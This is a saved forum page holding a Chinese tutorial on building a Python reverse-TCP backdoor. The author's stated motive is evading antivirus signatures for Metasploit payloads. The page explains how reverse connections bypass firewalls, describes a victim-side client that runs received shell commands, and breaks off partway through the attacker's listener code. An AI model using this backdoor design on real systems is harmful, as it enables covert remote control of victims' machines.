<!DOCTYPE html>
<!-- saved from url=(0039)https://bbs.pediy.com/thread-224228.htm -->
<html lang="zh-cn"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

	
	

	
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta name="author" content="XiunoBBS 4.0">
	<meta name="keywords" content="">
	<meta name="description" content="[原创]如何基于Python写一个TCP反向连接后门">
	<meta name="renderer" content="webkit">
	<meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">

	<title>
		[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛	</title>

	<link rel="shortcut icon" href="https://bbs.pediy.com/view/img/favicon.ico">
	<link rel="icon" sizes="32x32" href="https://bbs.pediy.com/view/img/favicon.ico">
	<link rel="Bookmark" href="https://bbs.pediy.com/view/img/favicon.ico">
	<link rel="stylesheet" href="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/bootstrap.css">

	<link rel="stylesheet" href="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/bootstrap-bbs.css">
	<!-- <link rel="stylesheet" href="view/css/bootstrap-icon.css"> -->
	<link rel="stylesheet" href="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/kanxue.css">
	<style>
		
		@media only screen and (max-width: 780px) {
			.card > .card-body {
				padding: 0.3rem 0.5rem;
			}
			#body {
				padding: 0.5rem 0.5rem;
			}
			.container {
				padding-left: 0;
				padding-right: 0; 
			}
		}
		.content_box ul.nav .nav-link.active {
			border-bottom: 3px solid #0099ee;
		}
	</style>

	    <link rel="stylesheet" href="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/user_tree.css" type="text/css">
    <link rel="stylesheet" href="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/folder-tree.css" type="text/css">
<style>
/*
box-shadow: 0 0 5px red;
*/
@keyframes xndigest {
	0% { color: red; text-shadow: 0 0 3px #FF8D8D;} 
	20% { color: orange; text-shadow: 0 0 3px #FFE1AD;} 
	40% { color: green; text-shadow: 0 0 3px #B3FFAF;} 
	65% { color: blue; text-shadow: 0 0 3px #AFE4FF;} 
	80% { color: purple; text-shadow: 0 0 3px #FFC9F3;} 
	100% { color: red; text-shadow: 0 0 3px #FF8D8D;} 
}

/*水晶闪烁效果 占内存*/
i.icon-diamond.flash{color: #D53D38;  /*animation: xndigest 5s linear infinite;*/ }

i.icon-digest-1 {  text-shadow: 0 0 3px #AFE4FF; }
i.icon-digest-2 {  text-shadow: 0 0 3px #FFF177; }
i.icon-digest-3 {  text-shadow: 0 0 3px #FF8D8D; }
.icon-digest-1:before { content: "\f219";  color: #5BC0DE;} /* "\f0a5" */
.icon-digest-2:before { content: "\f219";  color: #ECA541;}
.icon-digest-3:before { content: "\f219"; color: #D53D38;}
.icon-digest-3:afteer { content: "精"; color: #D53D38;}
</style><style>
.deleted div.subject > a { text-decoration: line-through; color: grey !important; }
.deleted div.message { text-decoration: line-through; color: grey !important; }
</style><style>
/*
.toggle_more {
	max-height: 100px;
}
*/
.update_log_list a.update_log_history, 
.update_log_list a.update_log_delete {
	display: none;
}

.update_log_list > li:hover {
	background: var(--gray-300);
}
.update_log_list > li:hover > a.update_log_history, 
.update_log_list > li:hover > a.update_log_delete {
	display: inline-block;
}

</style><style>
.icon-new { width: 26px; height: 12px; display: inline-block; background: url(view/img/new.gif)}
</style>
<link rel="stylesheet" href="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/layer.css" id="layuicss-skinlayercss"><link rel="stylesheet" type="text/css" href="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/syntax.css"><script src="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/syntax.js.下载"></script><script src="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/ga.js.下载"></script></head>

<body>

	

	<style>
.btn-default {
    color: #333;
    background-color: #fff;
    border-color: #ccc;
}
#header {
    /* border-top: 3px solid #0099ee; */
    box-shadow: 0px 2px 10px 0px rgba(0, 0, 0, 0.1), 0 1px rgba(0, 0, 0, 0.1);
    background: #fafafa;
}

#header .container {
    height: 64px;
    line-height: 64px;
}

#header .navbar {
    padding: 0;
}

#header nav li.nav-item {
    line-height: 34px;
}

#header nav a.nav-link {
    font-size: 16px;
    color: #757575;
    font-weight: 500;
    text-decoration: none;
}
#header .login_btn,  #header .reg_btn{
	font-size: 13px;
	padding: 4px 16px;
	
	font-weight: 500;
	color: #0099ee;
	text-decoration: none;
	border: 1px solid #0099ee;
}
#header .reg_btn {
	color: #fff;
	background: #0099ee;
}
#header nav a.nav-link,
#header nav .dropdown {
    padding: 0 1rem;
}

#header nav a.nav-link:hover {
    background-color: #F3F3F3;
}

#header nav li.nav-item.active a {
    color: #0099ee;
    font-weight: 600;
}

#header nav .home_seach_form {
    border: 1px solid #ccc;
    border-radius: 4px;
}

#header nav .dropdown a.dropdown-item:hover {
    color: #0099ee;
    text-decoration: none;
    background-color: #f3f3f3;
}

.dropup .dropdown-toggle::after {
    display: none !important;
}
.header_nav_a {
    /* padding: 10px 0; */
}
.bottom-nav {
    /* display: none; */
    background-color: #fafafa;
    box-shadow: 0 -1px rgba(0,0,0,0.1), 0 -2px 10px rgba(0,0,0,0.1);
}
.bottom-nav .opts-group {
    position: relative;
    display: inline-block;
    /* padding-top: 6px; */
    line-height: 20px;
    color: #9e9e9e;
    cursor: pointer;
}
.bottom-nav .opts-group.active {
    color: #0099ee;
}

@media only screen and (min-width: 992px) {
    .bottom-nav, .header_seach_but {
        display: none !important;
    }
    
}
@media only screen and (max-width: 992px) {
    .nav-logo {
        margin-right: 0 !important;
    }

	.nav_user_item {
		width: 96px;
	}
	.nav_user_item .login_btn,  .nav_user_item .reg_btn {
		padding: 3px 6px !important;
	}
}

.seach_li {
    margin-left: 40px;
}

@media only screen and (max-width: 1200px) {
    .seach_li {
        margin-left: 0px !important;
        width: 100%;
        max-width: 120px !important;
    }
}
</style>
<header id="header">
    <div class="container" style="padding-right: 15px;padding-left: 15px;">
        <nav class="navbar navbar-expand-lg navbar-light">
            <a href="https://bbs.pediy.com/search.htm" class="header_seach_but" style="display:block; width: 96px;"><i class="icon-search" aria-hidden="true"></i></a>
            <a class="navbar-brand nav-logo" href="https://bbs.pediy.com/" style="line-height: 0px;">
                <img src="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/kanxuelogo.png" height="25">
            </a>
            <div class="collapse navbar-collapse" id="navbarTogglerDemo03">
                <ul class="navbar-nav mr-auto mt-2 mt-lg-0">
                    <li class="nav-item">
                        <a class="nav-link" href="https://www.kanxue.com/">首页</a>
                    </li>
                    <li class="nav-item active">
                        <a class="nav-link" href="https://bbs.pediy.com/">论坛</a>
                    </li>
                    <li class="nav-item ">
                        <a class="nav-link " href="https://zhuanlan.kanxue.com/">专栏</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="https://www.kanxue.com/course.htm">课程</a>
                    </li>
                    <li class="nav-item position-relative">
                            <a class="nav-link" href="https://ctf.pediy.com/">CTF</a>
                            <!-- <img class="position-absolute" style="width: 27px; top: -5px; right: -7px; z-index: 3;" src="//passport.kanxue.com/pc/view/img/hot.png" alt=""> -->
                    </li>
                    <li class="nav-item position-relative">
                            <a class="nav-link" href="https://www.kanxue.com/conference.htm">看雪峰会</a>
                            <img class="position-absolute" style="width: 27px; top: -5px; right: -7px; z-index: 3;" src="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/hot.png" alt="">
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" target="_blank" href="https://qifu.kanxue.com/">企服</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="https://job.kanxue.com/">招聘</a>
                    </li>
                    
                    <li class="nav-item">
                        <div class="dropdown">
                            <a class="dropdown-toggle nav-link px-0" href="https://bbs.pediy.com/thread-224228.htm#" role="button" id="dropdownMenuLink" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                                发现
                            </a>
                            <div class="dropdown-menu " aria-labelledby="dropdownMenuLink">
                                <!-- <a class="dropdown-item" href="//ctf.pediy.com">CTF</a> -->
                                <a class="dropdown-item" href="https://ce.kanxue.com/">众测</a>
                                <a class="dropdown-item" href="https://www.kanxue.com/rank.htm">排行榜</a>
                                <a class="dropdown-item" href="https://www.kanxue.com/chm.htm">知识库</a>
                                <a class="dropdown-item" href="https://www.kanxue.com/tool.htm">工具下载</a>
                                <!-- <a class="dropdown-item" href="//www.kanxue.com/conference.htm">看雪峰会</a> -->
                                <a class="dropdown-item" href="https://www.kanxue.com/mrt.htm">看雪20年</a>
                                <a class="dropdown-item" href="https://www.kanxue.com/shop.htm">看雪商城</a>
                            </div>
                        </div>
                    </li>
                    <li class="seach_li">
                        <form class="form-inline my-2 my-lg-0 mr-auto" action="https://bbs.pediy.com/search.htm" id="search_form" style="margin-right: 20px; max-width: 150px;">
                            <div class="input-group home_seach_form">
                                <input type="text" class="form-control border-0" name="keyword" placeholder="论坛关键词 回车搜索">
                                <div class="input-group-append">
                                    <button class="btn px-2" type="submit" id="button-addon2">
                                        <i class="icon-search"></i>
                                    </button>
                                </div>
                            </div>
                        </form>
                    </li>
                </ul>
                
            </div>
            <div class="text-right nav_user_item" style="white-space: nowrap;">
                                    
                <a class="login_btn" href="https://passport.kanxue.com/user-login.htm">登录</a>
                <a class="reg_btn ml-2" href="https://passport.kanxue.com/user-mobile-1.htm">注册</a>
                            </div>
            
        </nav>
    </div>
</header>
<div class="position-fixed w-100 header_fiexd bottom-nav" style="width: 100%; height: 50px; bottom: 0px; z-index: 2; background: rgb(250, 250, 250); display: block;">
    <div class="row mx-0 text-center align-items-center" style="height: 50px;">
        <a href="https://www.kanxue.com/" class="d-inline-blok col px-0 header_nav_a opts-group " style="max-width: 20%;">
            <div>
                <i class="icon-home"></i>
            </div>
            <div>
                首页
            </div>
        </a>
        <a href="https://bbs.pediy.com/" class="d-inline-blok col px-0 header_nav_a opts-group active" style="max-width: 20%;">
            <div>
                <i class="icon-comments"></i>

            </div>
            <div>
                论坛
            </div>
        </a>
        <a href="https://zhuanlan.kanxue.com/" class="d-inline-blok col px-0 header_nav_a opts-group " style="max-width: 20%;">
            <div>
                <i class="icon-clipboard"></i>
            </div>
            <div>
                专栏
            </div>
        </a>
        <a href="https://www.kanxue.com/course.htm" class="d-inline-blok col px-0 header_nav_a opts-group" style="max-width: 20%;">
            <div>
                <i class="icon-book"></i>
            </div>
            <div>
                课程
            </div>
        </a>
        
        <!-- <a href="#" class="d-inline-blok col px-0" style="max-width: 20%;"> -->
        <div class=" dropup d-inline-blok col px-0" style="max-width: 20%;">
            <a class="dropdown-toggle d-inline-block header_nav_a opts-group" href="https://bbs.pediy.com/thread-224228.htm#" role="button" id="dropdownMenuLink" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                <div>

                    <i class="icon-list"></i>
                </div>
                <div>
                    发现
                </div>
            </a>
            <div class="dropdown-menu" aria-labelledby="dropdownMenuLink">
                <a class="dropdown-item" href="https://qifu.kanxue.com/">企服</a>
                <a class="dropdown-item" href="https://job.kanxue.com/">招聘</a>
                <a class="dropdown-item" href="https://ctf.pediy.com/">CTF</a>
                <a class="dropdown-item" href="https://ce.kanxue.com/">众测</a>
                <a class="dropdown-item" href="https://www.kanxue.com/rank.htm">排行榜</a>
                <a class="dropdown-item" href="https://www.kanxue.com/chm.htm">知识库</a>
                <a class="dropdown-item" href="https://www.kanxue.com/tool.htm">工具下载</a>
                <a class="dropdown-item" href="https://www.kanxue.com/conference.htm">看雪峰会</a>
                <a class="dropdown-item" href="https://www.kanxue.com/mrt.htm">看雪20年</a>
                <a class="dropdown-item" href="https://www.kanxue.com/shop.htm">看雪商城</a>
            </div>
        </div>
        <!-- </a> -->
    </div>
</div>




				<main style="background: #f0f5f8 url(plugin/kanxue/img/body_bg.jpg) repeat-x" id="body"> 
		<div class="container">
					

					<style>
			.qqFace img:hover {
				border-color: #0066cc !important;
			}
		</style>
		
		<ol class="breadcrumb mb-2 hidden-md-down">
			<li class="breadcrumb-item"><a href="https://bbs.pediy.com/" aria-label="首页"><i class="icon-home"></i> 看雪论坛</a></li>
			<li class="breadcrumb-item"><a href="https://bbs.pediy.com/forum-32.htm">『外文翻译』</a></li>
			<!-- <li class="breadcrumb-item active"><a href="thread-224228.htm" title="首页返回主题第一页">[原创]如何基于Python写一个TCP反向连接后门</a></li> -->
			

			<div class="media-body text-right">
							<a href="https://bbs.pediy.com/thread-create-32.htm" role="button" class="btn btn-sm btn-primary" style="float: right;">发新帖</a>
						</div>
		</ol>
		
	
		<div class="card">
			<div class="card-body">
				<div class=" d-none d-lg-block">
					<dl class="row">
						<dt class="vtop pr-3" style="width: 70px; text-align: center;">
							<div class="avatar_info">
								<a href="https://bbs.pediy.com/user-214974.htm" aria-hidden="true" tabindex="-1">
									<img class="avatar-3" src="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/214974.png">
								</a>
								<div class="mt-1" style=" height: 15px;">
									<span class="group group-113" data-gid="113" onmouseover="show_level(event)" title="十三级"></span>
									
								</div>
								
								<div class="mt-1" style="position: relative; height: 16px;">
									<img style="position:absolute;left: 6px;" src="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/stars04.gif" alt=""> 
								</div>
								
							</div>
						</dt>
						
						<dd class="vtop">
							<dl class="row small" style="height: 34px; line-height: 34px;">
								<dt style="padding: 0px;">
									
									<h3 class="break-all subject m-0">
																						
																[原创]如何基于Python写一个TCP反向连接后门																				
																		
									<i class="icon-digest-2" aria-hidden="true" title="优秀"></i>
							
									</h3>
									
								</dt>
								<dd class="text-right">
									<span class="date text-grey ml-1">2018-1-22 08:07</span>
									<span class="text-grey ml-3 hidden-md-down"><i class="icon-eye" aria-hidden="true"></i> 2861</span>
								</dd>
							</dl>
							<dl class="row small mt-0">
								<dt style="padding: 0px;">
									
									<div>
										<span class="username font-weight-bold">
											<a href="https://bbs.pediy.com/user-214974.htm">lipss</a>
										</span>
										
																					<div class="d-inline-block" style="transform:scale(.8); -ms-transform:scale(.8); -webkit-transform:scale(.8);">
												<a href="https://bbs.pediy.com/user-214974-1-1.htm">
													<span class="icon-diamond text-danger" title="精华数"></span>
													<span class="font-weight-bold text-danger"> 4</span>
												</a>
											</div>
																				
										<span class="post_online_time" style="vertical-align: text-bottom;" data-online_time="1750994" data-desc="在线时长: 486 小时 ( 13 级)&lt;br/&gt; 升级还需要 17 小时" onmouseenter="show_online_level(event)"><img src="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/moon.gif" width="13" height="13" style="opacity: 0.65; margin-right: 2px;"><img src="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/moon.gif" width="13" height="13" style="opacity: 0.65; margin-right: 2px;"><img src="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/moon.gif" width="13" height="13" style="opacity: 0.65; margin-right: 2px;"><img src="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/star.gif" width="13" height="13" style="opacity: 0.65; margin-right: 2px;"></span>
									</div>
									
								</dt>
								<dd class="text-right">
																																				
																		
																	</dd>
							</dl>
							
													</dd>
					</dl>
				</div>
				<!-- choadi 手机端适配 开始-->
				<div class="px-3 pt-3 d-block d-lg-none">
					
					<h3 class="break-all subject m-0">
																		
												[原创]如何基于Python写一个TCP反向连接后门												
																		
									<i class="icon-digest-2" aria-hidden="true" title="优秀"></i>
							
					</h3>
					
					<div class="row mx-0 mt-2">
						<div class="col px-0">
							<a href="https://bbs.pediy.com/user-214974.htm" aria-hidden="true" tabindex="-1">
								<img style="width: 18px; height: 18px; border-radius: 6rem;" src="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/214974.png">
							</a>
							
							<a class="small" href="https://bbs.pediy.com/user-214974.htm">lipss</a>
														
							<span style="vertical-align: text-bottom; transform:scale(.8); -ms-transform:scale(.8); -webkit-transform:scale(.8);" class="group group-113" data-gid="113" onmouseover="show_level(event)" title="十三级"></span>
								
															<div class="d-inline-block" style="font-size: 12px;">
									<span class="icon-diamond text-danger" title="精华数"></span>
									<span class="font-weight-bold text-danger"> 4</span>
								</div>
													</div>
						<div class="col px-0 text-right">
															
																
																
														</div>
						<!-- <img style="" src="//bbs.pediy.com/view/img/stars04.gif" alt="">  -->
						
						
					</div>
					<div class="small row mx-0 mt-2">
						<div class="col px-0">
							<span class="post_online_time" style="vertical-align: text-bottom;" data-online_time="1750994" data-desc="在线时长: 486 小时 ( 13 级)&lt;br/&gt; 升级还需要 17 小时" onmouseenter="show_online_level(event)"><img src="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/moon.gif" width="13" height="13" style="opacity: 0.65; margin-right: 2px;"><img src="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/moon.gif" width="13" height="13" style="opacity: 0.65; margin-right: 2px;"><img src="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/moon.gif" width="13" height="13" style="opacity: 0.65; margin-right: 2px;"><img src="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/star.gif" width="13" height="13" style="opacity: 0.65; margin-right: 2px;"></span>
						</div>
						<div class="col px-0 text-right">
																					
													</div>
					</div>
					<div class="small row mx-0 mt-2">
						<div class="col px-0"><span class="date text-grey">2018-1-22 08:07</span></div>
						<div class="col px-0 text-right"><span class="text-grey hidden-md-down"><i class="icon-eye" aria-hidden="true"></i> 2861</span></div>
					</div>
					
									</div>
				<!-- choadi 手机端适配 结束-->


				<hr aria-hidden="true">
					
				<div class="message break-all" isfirst="1">
								
					
					<p>不好意思，首发了安全客。如何报名参加看雪翻译组？<br>https://www.anquanke.com/post/id/92401</p>
<h1><a name="" class="anchor" href="https://bbs.pediy.com/thread-224228.htm"><span class="header-link"></span></a>0x0 介绍</h1><p>　　在Linux系统做未授权测试,我们须准备一个安全的渗透环境，通常第一件事就是安装虚拟机。且在攻击阶段中还需要对受害系统进行控制。常见的后门大多数是利用Metasploit生成，而目前反病毒产品遇到Metasploit文件签名的程序就会添加特征库作为查杀对象，所以开发出自己的后门程序非常必要。<br>　<br>　　这篇文章将介绍如何写一个具有反向连接功能的后门。</p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p><strong>反向连接</strong>：通常的网络连接程序是由客户端通过服务器开放的端口连接到服务器，反向连接是客户端打开服务器端口，由服务器主动连接客户端。反向连接这种方式常用于绕过防火墙和路由器安全限制。</p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>　　举个例子，防火墙隔离的计算机会阻止传入的连接，但对于连接Intnet服务器的出站连接则不做严格限制。一旦连接建立网络通讯，远程主机就可以向后门发送命令。这种通讯方法更有助于控制受控机器，也更不容易检测。</p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>　　在本系列教程文章中，将分成3部分撰写，一步步介绍如何用Python语言开发一个反向TCP连接程序。每一个部分都会介绍一个新函数、命令或代码，使其更加灵活。</p>
<h1><a name="" class="anchor" href="https://bbs.pediy.com/thread-224228.htm"><span class="header-link"></span></a>0x1 第一部分：创建反向连接基础</h1><p>　　这一部分将介绍创建网络连接，发送和接受输出。</p>
<h2><a name="" class="anchor" href="https://bbs.pediy.com/thread-224228.htm"><span class="header-link"></span></a>1.1 服务器端编写(控制端)</h2><p>　　前面介绍过，攻击者并不会主动连接受控服务器，因为会被受控制服务器的防火墙拦截。<br>　　但是我们可以把自身当成服务器，让受控服务器作为客户端反向连接我们，然后向客户端发送命令。客户端与服务端安装套接字实现反向连接的代码如下：</p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p> <img src="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/3_EFAGYR79DRXQFE4.png" style="max-width: 100%; cursor: pointer;" alt="图片描述" class="div_message_boxShadow"></p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>让我们分解以上代码，逐行解释每段代码的作用：</p>
<ul>
<li><p>整体思路：声明subprocess模块中的sp函数执行命令</p>
</li>
<li><p>1）监听信息：通过获取命令行参数得到套接字监听的主机IP、端口</p>
</li>
<li><p>2）套接字部分：安装套接字，绑定套接字，监听连接、接收客户端的连接</p>
</li>
<li><p>3）输出连接信息：如果有网络连接信息，就打印出来</p>
</li>
<li><p>4）循环部分：将脚本运行到一个while循环中，以便发送命令并接收输出</p>
<p>5）if判断-1： 如果输入的命令不是"exit()"程序继续运行，否则发送给客户端"exit()",让客户端关闭套接字连接</p>
</li>
<li><p>6）if判断-2：如果输入的命令是空的，我们再次跳过while循环。不执行后面的命令</p>
</li>
<li><p>7）发送、接收命令：如果if判断没有执行退出或者跳过，则负责发送和接收命令</p>
</li>
<li><p>8）处理接收结果：将接收的数据和数据实际大小切割开来存放</p>
</li>
<li><p>9）处理数据：如果接收的数据实际大小跟接收数据的大小不匹配，那就运行一个while循环把剩余的数据拼接起来，直到数据实际大小跟接收数据结果相等</p>
</li>
<li><p>10）打印结果过滤换行符</p>
</li>
<li><p>11）出现异常则关闭套接字</p>
</li>
</ul>
<p>　　以上代码理解起来并不困难，但是随着代码的复杂度不会再逐行解释，只解释重要的部分。接下来让我们编写客户端的Socket部分。</p>
<h2><a name="" class="anchor" href="https://bbs.pediy.com/thread-224228.htm"><span class="header-link"></span></a>1.2 客户端代码编写(受控制端)</h2><p>　　受害者连接我们的代码不应该太多。<br> <img src="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/3_Z3H96A4NZACAP3T.png" style="max-width: 100%; cursor: pointer;" alt="图片描述" class="div_message_boxShadow"></p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>让我们分解以上代码，逐行解释每段代码的作用：</p>
<ul>
<li><p>1）通过sys.argv模块的命令行接受Socket套接字信息</p>
</li>
<li><p>2）设置Socket套接字并连接到指定的主机IP、端口。 </p>
</li>
<li><p>3）接收服务器发送的命令的部分放在一个循环语句内。 </p>
</li>
<li><p>4）如果接收的命令不是exit()，就通过管道执行接收的命令。执行命令后的输出分配给变量sh。</p>
</li>
<li><p>5）（out,err）是标准的stdout和stderr流。</p>
</li>
<li><p>6）将流的输出分配给result变量。</p>
</li>
<li><p>7）将文件大小设置为16字节的long型，用于助服务器端（攻击者）识别文件大小。</p>
</li>
<li><p>8）计算长度并将其附加到输出里。</p>
</li>
</ul>
<p>if-else后的部分：如果收到的命令是exit()，跳出循环和关闭连接。 </p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>执行我们的攻击者（服务器）脚本，看看结果如下：</p>
<table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  python"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="python plain">root@Sploit:~</code><code class="python keyword">/</code><code class="python plain">Desktop</code><code class="python comments"># python reverseTcp.py '' 8000</code></div></div></td></tr></tbody></table><p> 客户端连接命令行的主机信息。 </p>
<table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  python"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="python plain">root@Sploit:~</code><code class="python keyword">/</code><code class="python plain">Desktop</code><code class="python comments"># python connect.py 127.0.0.1 8000</code></div></div></td></tr></tbody></table><p>服务器脚本运行的截图：</p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p> <img src="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/3_3EKJN25JTTQK7EY.png" style="max-width: 100%; cursor: pointer;" alt="图片描述" class="div_message_boxShadow"></p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>　　正如预期，客户机控制台是空的，因为我们没有打印任何东西。预期编写完成后的截图如下：</p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p> <img src="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/3_4AH4W5TGKBCWYDC.png" style="max-width: 100%; cursor: pointer;" alt="图片描述" class="div_message_boxShadow"></p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>　　到此我们已经将基础的反向TCP连接代码编写完成了，现在将继续编写些基础函数来帮助我们把程序界面改善，例如给Shell界面添加颜色。<br>　　这份代码在Windows上也可以运行，但Windows平台不是本系列教程的首选平台。</p>
<h2><a name="" class="anchor" href="https://bbs.pediy.com/thread-224228.htm"><span class="header-link"></span></a>1.3 实践部分</h2><p><strong>reverseTcp.py</strong></p>
<table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  python "><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div><div class="line number19 index18 alt2">19</div><div class="line number20 index19 alt1">20</div><div class="line number21 index20 alt2">21</div><div class="line number22 index21 alt1">22</div><div class="line number23 index22 alt2">23</div><div class="line number24 index23 alt1">24</div><div class="line number25 index24 alt2">25</div><div class="line number26 index25 alt1">26</div><div class="line number27 index26 alt2">27</div><div class="line number28 index27 alt1">28</div><div class="line number29 index28 alt2">29</div><div class="line number30 index29 alt1">30</div><div class="line number31 index30 alt2">31</div><div class="line number32 index31 alt1">32</div><div class="line number33 index32 alt2">33</div><div class="line number34 index33 alt1">34</div><div class="line number35 index34 alt2">35</div><div class="line number36 index35 alt1">36</div><div class="line number37 index36 alt2">37</div><div class="line number38 index37 alt1">38</div><div class="line number39 index38 alt2">39</div><div class="line number40 index39 alt1">40</div><div class="line number41 index40 alt2">41</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="python comments"># -*- coding: utf-8 -*-</code></div><div class="line number2 index1 alt1"><code class="python keyword">import</code> <code class="python plain">socket,subprocess as sp,sys&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </code><code class="python comments"># 导入subprocess，socket模块</code></div><div class="line number3 index2 alt2">&nbsp;</div><div class="line number4 index3 alt1"><code class="python comments"># 1）监听信息</code></div><div class="line number5 index4 alt2"><code class="python plain">host </code><code class="python keyword">=</code> <code class="python plain">sys.argv[</code><code class="python value">1</code><code class="python plain">]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </code><code class="python comments"># 攻击者地址，通常留空''</code></div><div class="line number6 index5 alt1"><code class="python plain">port </code><code class="python keyword">=</code> <code class="python functions">int</code><code class="python plain">(sys.argv[</code><code class="python value">2</code><code class="python plain">])&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </code><code class="python comments"># 攻击者主机端口</code></div><div class="line number7 index6 alt2">&nbsp;</div><div class="line number8 index7 alt1"><code class="python comments"># 2）套接字部分</code></div><div class="line number9 index8 alt2"><code class="python plain">s </code><code class="python keyword">=</code> <code class="python plain">socket.socket(socket.AF_INET,socket.SOCK_STREAM) </code><code class="python comments"># 安装套接字</code></div><div class="line number10 index9 alt1"><code class="python plain">s.bind((host,port))&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </code><code class="python comments"># 绑定套接字</code></div><div class="line number11 index10 alt2"><code class="python plain">s.listen(</code><code class="python value">100</code><code class="python 